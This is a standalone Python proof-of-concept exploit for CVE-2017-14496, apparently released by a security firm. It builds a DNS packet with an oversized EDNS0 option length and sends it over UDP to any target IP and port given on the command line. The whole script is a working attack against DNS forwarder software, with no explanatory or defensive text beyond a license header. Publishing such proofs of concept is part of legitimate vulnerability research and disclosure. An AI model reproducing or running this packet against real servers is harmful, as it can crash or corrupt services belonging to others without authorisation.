#!/usr/bin/python
#
# Copyright 2017 Global Security Experts Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Author:
#  Ohji Kashiwazaki <okashiwazaki@gsx.co.jp>
from binascii import unhexlify
from struct import pack
import socket
import sys

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

EDNS0_OPTION_NOMDEVICEID = 65073
EDNS0_OPTION_NOMCPEID    = 65074

def cve_2017_14496(optno):
  data = b"".join([
    # ---- Header
    '\x00\x00',  # ID
    '\x00\x00',  # flags
    u16(0),      # QDCOUNT/ZOCOUNT
    u16(0),      # ANCOUNT/PRCOUNT
    u16(0),      # NSCOUNT/UPCOUNT
    u16(1),      # ARCOUNT

    # ---- Additional Record
    u8(0),       # NAME
    u16(41),     # TYPE = OPT
    u16(1024),   # CLASS(udp_size)
    '\x00\x00\x00\x00', # TTL
    u16(5),      # RDLEN

    u16(optno),  # RDATA option-code
    u16(1 + 4),  # RDATA option-length(larger than option-data length)
    '\x00',      # RDATA option-data
    ])
  return data

def send_packet(ip, port, optno):
  packet = cve_2017_14496(optno)
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST, 1)
  s.sendto(packet, (ip, port))
  s.close()

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print 'Usage: %s <ip> <port>' % sys.argv[0]
    sys.exit(0)

  ip = sys.argv[1]
  port = int(sys.argv[2])

  send_packet(ip, port, EDNS0_OPTION_NOMDEVICEID)
  send_packet(ip, port, EDNS0_OPTION_NOMCPEID)
